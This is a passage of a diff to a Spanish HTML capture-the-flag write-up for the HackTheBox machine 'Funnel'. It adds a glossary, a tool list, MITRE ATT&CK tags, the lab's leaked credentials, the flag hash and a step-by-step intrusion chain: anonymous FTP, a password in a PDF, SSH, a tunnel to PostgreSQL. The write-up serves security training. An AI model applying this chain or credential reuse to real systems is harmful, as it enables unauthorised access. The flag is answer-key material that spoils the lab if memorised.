+        <span class="glosario-def">Very Secure FTP Daemon — servidor FTP para Linux. Nombre irónico dado que la seguridad depende de su configuración. Aquí tiene anonymous login habilitado.</span>
+      </div>
+      <div class="glosario-item">
+        <span class="glosario-term">FlateDecode / zlib</span>
+        <span class="glosario-def">Algoritmo de compresión usado en PDFs para comprimir streams de datos (texto, imágenes). zlib.decompress() en Python lo descomprime para extraer texto plano.</span>
+      </div>
+      <div class="glosario-item">
+        <span class="glosario-term">sshpass</span>
+        <span class="glosario-def">Utilidad Linux que proporciona contraseñas SSH de forma no interactiva a través de variable de entorno. Permite automatizar logins SSH en scripts.</span>
+      </div>
+      <div class="glosario-item">
+        <span class="glosario-term">SSH Port Forwarding (-L)</span>
+        <span class="glosario-def">Funcionalidad SSH que crea túneles TCP. Local forwarding (-L) redirige un puerto local al servidor remoto. Permite acceder a servicios internos no expuestos.</span>
+      </div>
+    </div>
+    <div>
+      <div class="glosario-item">
+        <span class="glosario-term">PostgreSQL</span>
+        <span class="glosario-def">Sistema de base de datos relacional open-source. Puerto 5432. psql es su cliente CLI. pg_hba.conf controla quién puede conectarse y desde dónde.</span>
+      </div>
+      <div class="glosario-item">
+        <span class="glosario-term">ss (Socket Statistics)</span>
+        <span class="glosario-def">Herramienta Linux moderna para ver sockets de red activos. Reemplaza a netstat. -tlnp muestra sockets TCP en LISTEN con proceso asociado.</span>
+      </div>
+      <div class="glosario-item">
+        <span class="glosario-term">Loopback (127.0.0.1)</span>
+        <span class="glosario-def">Interfaz de red virtual que solo acepta conexiones del mismo sistema. Servicios escuchando en 127.0.0.1 no son accesibles desde la red externa — solo localmente.</span>
+      </div>
+      <div class="glosario-item">
+        <span class="glosario-term">Credenciales por defecto</span>
+        <span class="glosario-def">Contraseñas predefinidas en sistemas o aplicaciones antes de que el usuario las personalice. Son la causa de numerosas brechas reales si no se cambian en el primer uso.</span>
+      </div>
+      <div class="glosario-item">
+        <span class="glosario-term">PGPASSWORD</span>
+        <span class="glosario-def">Variable de entorno de PostgreSQL que contiene la contraseña para conexiones no interactivas. Alternativa a escribir la contraseña manualmente en psql.</span>
       </div>
     </div>
   </div>
 </div>
 
-<script>
-  const canvas=document.getElementById('matrix');const ctx=canvas.getContext('2d');
-  canvas.width=window.innerWidth;canvas.height=window.innerHeight;
-  window.addEventListener('resize',()=>{canvas.width=window.innerWidth;canvas.height=window.innerHeight;});
-  const chars='アイウエオカキクケコ0123456789ABCDEF<>{}[]';const fontSize=14;
-  let cols=Math.floor(canvas.width/fontSize);let drops=Array(cols).fill(1);
-  function drawMatrix(){ctx.fillStyle='rgba(10,14,26,0.05)';ctx.fillRect(0,0,canvas.width,canvas.height);ctx.fillStyle='#4ade80';ctx.font=fontSize+'px monospace';for(let i=0;i<drops.length;i++){const char=chars[Math.floor(Math.random()*chars.length)];ctx.fillText(char,i*fontSize,drops[i]*fontSize);if(drops[i]*fontSize>canvas.height&&Math.random()>0.975)drops[i]=0;drops[i]++;}}
-  setInterval(drawMatrix,35);
-</script>
+</main>
+
+<!-- ═══════════════════════════════════════════════════════ SIDEBAR ═══ -->
+<aside class="sidebar">
+
+  <div class="sidebar-card">
+    <h4>Ficha Técnica</h4>
+    <div class="meta-row"><span class="meta-label">Máquina</span><span class="meta-value">Funnel</span></div>
+    <div class="meta-row"><span class="meta-label">Plataforma</span><span class="meta-value">HackTheBox</span></div>
+    <div class="meta-row"><span class="meta-label">Categoría</span><span class="meta-value">Starting Point</span></div>
+    <div class="meta-row"><span class="meta-label">Dificultad</span><span class="meta-value" style="color:var(--green);">Very Easy</span></div>
+    <div class="meta-row"><span class="meta-label">OS</span><span class="meta-value">Linux (Ubuntu)</span></div>
+    <div class="meta-row"><span class="meta-label">IP</span><span class="meta-value">10.129.7.157</span></div>
+    <div class="meta-row"><span class="meta-label">Puertos</span><span class="meta-value">21, 22</span></div>
+    <div class="meta-row"><span class="meta-label">Interno</span><span class="meta-value">5432 (psql)</span></div>
+    <div class="meta-row"><span class="meta-label">Fecha</span><span class="meta-value">2026-03-17</span></div>
+    <div class="meta-row"><span class="meta-label">Tiempo</span><span class="meta-value">~8 min</span></div>
+    <div class="meta-row"><span class="meta-label">Comandos</span><span class="meta-value">7</span></div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Herramientas Usadas</h4>
+    <div style="display:flex;flex-direction:column;gap:.4rem;">
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.75rem;">nmap</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">Port scan + scripts NSE</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.75rem;">ftp</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">Cliente FTP anónimo</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.75rem;">python3 + zlib</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">Extracción texto PDF</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.75rem;">sshpass</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">SSH no-interactivo</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;border-bottom:1px solid var(--border);">
+        <span style="color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.75rem;">ssh -L</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">Local port forwarding</span>
+      </div>
+      <div style="display:flex;align-items:center;gap:.5rem;font-size:.82rem;padding:.3rem 0;">
+        <span style="color:var(--accent);font-family:'JetBrains Mono',monospace;font-size:.75rem;">psql</span>
+        <span style="color:var(--text-muted);font-size:.75rem;">Cliente PostgreSQL</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Tabla de Contenidos</h4>
+    <a class="toc-link" href="#descripcion"><span class="toc-num">1</span>Descripción</a>
+    <a class="toc-link" href="#reconocimiento"><span class="toc-num">2</span>Reconocimiento</a>
+    <a class="toc-link" href="#vulnerabilidades"><span class="toc-num">3</span>Vulnerabilidades</a>
+    <a class="toc-link" href="#timeline"><span class="toc-num">4</span>Timeline</a>
+    <a class="toc-link" href="#explotacion"><span class="toc-num">5</span>Explotación</a>
+    <a class="toc-link" href="#flag"><span class="toc-num">6</span>Flag</a>
+    <a class="toc-link" href="#recomendaciones"><span class="toc-num">7</span>Recomendaciones</a>
+    <a class="toc-link" href="#lecciones"><span class="toc-num">9</span>Lecciones</a>
+    <a class="toc-link" href="#mitre"><span class="toc-num">10</span>MITRE ATT&amp;CK</a>
+    <a class="toc-link" href="#glosario"><span class="toc-num">11</span>Glosario</a>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>MITRE ATT&amp;CK</h4>
+    <span class="mitre-tag">T1046</span>
+    <span class="mitre-tag">T1190</span>
+    <span class="mitre-tag">T1552.001</span>
+    <span class="mitre-tag">T1078</span>
+    <span class="mitre-tag">T1021.004</span>
+    <span class="mitre-tag">T1572</span>
+    <span class="mitre-tag">T1005</span>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Credenciales Obtenidas</h4>
+    <div style="background:#050810;border-radius:8px;padding:.75rem 1rem;font-family:'JetBrains Mono',monospace;font-size:.75rem;margin-bottom:.5rem;">
+      <div style="color:var(--text-muted);margin-bottom:.25rem;"># SSH</div>
+      <div><span style="color:var(--purple);">christine</span><span style="color:var(--text-dim);">:</span><span style="color:var(--yellow);">funnel123#!#</span></div>
+    </div>
+    <div style="background:#050810;border-radius:8px;padding:.75rem 1rem;font-family:'JetBrains Mono',monospace;font-size:.75rem;">
+      <div style="color:var(--text-muted);margin-bottom:.25rem;"># PostgreSQL (misma)</div>
+      <div><span style="color:var(--purple);">christine</span><span style="color:var(--text-dim);">:</span><span style="color:var(--yellow);">funnel123#!#</span></div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Flag</h4>
+    <div style="background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);border-radius:8px;padding:.9rem;text-align:center;">
+      <div style="font-size:.65rem;color:var(--text-muted);text-transform:uppercase;letter-spacing:2px;margin-bottom:.5rem;">secrets.flag</div>
+      <div style="font-family:'JetBrains Mono',monospace;font-size:.72rem;color:var(--accent);word-break:break-all;font-weight:700;">cf277664b1771217d7006acdea006db1</div>
+    </div>
+  </div>
+
+  <div class="sidebar-card">
+    <h4>Cadena de Ataque</h4>
+    <div style="display:flex;flex-direction:column;gap:.35rem;font-size:.75rem;">
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text-dim);font-family:'JetBrains Mono',monospace;">1. nmap → FTP anon</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--blue);color:var(--text-dim);font-family:'JetBrains Mono',monospace;">2. ftp → mail_backup</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--orange);color:var(--text-dim);font-family:'JetBrains Mono',monospace;">3. PDF → funnel123#!#</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--yellow);color:var(--text-dim);font-family:'JetBrains Mono',monospace;">4. SSH christine ✓</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--purple);color:var(--text-dim);font-family:'JetBrains Mono',monospace;">5. ss → psql:5432</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--cyan);color:var(--text-dim);font-family:'JetBrains Mono',monospace;">6. ssh -L 15432</div>
+      <div style="background:#050810;border-radius:5px;padding:.4rem .6rem;border-left:2px solid var(--accent);color:var(--accent);font-family:'JetBrains Mono',monospace;font-weight:700;">7. psql → FLAG ✅</div>
+    </div>
+  </div>
+
+</aside>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ FOOTER ═══ -->
+<footer style="background:var(--bg2);border-top:1px solid var(--border);padding:1.5rem;text-align:center;margin-top:3rem;">
+  <p style="color:var(--text-muted);font-size:.82rem;">HTB Starting Point · Funnel · Very Easy · Linux · FTP 21 + SSH 22 + PostgreSQL 5432 · 2026-03-17</p>
+  <p style="color:var(--text-muted);font-size:.78rem;margin-top:.35rem;">Reporte generado por <span style="color:var(--accent);">kali</span> · Cadena: FTP anon → PDF leak → default creds → SSH tunnel → psql</p>
+</footer>
+
 </body>
 </html>
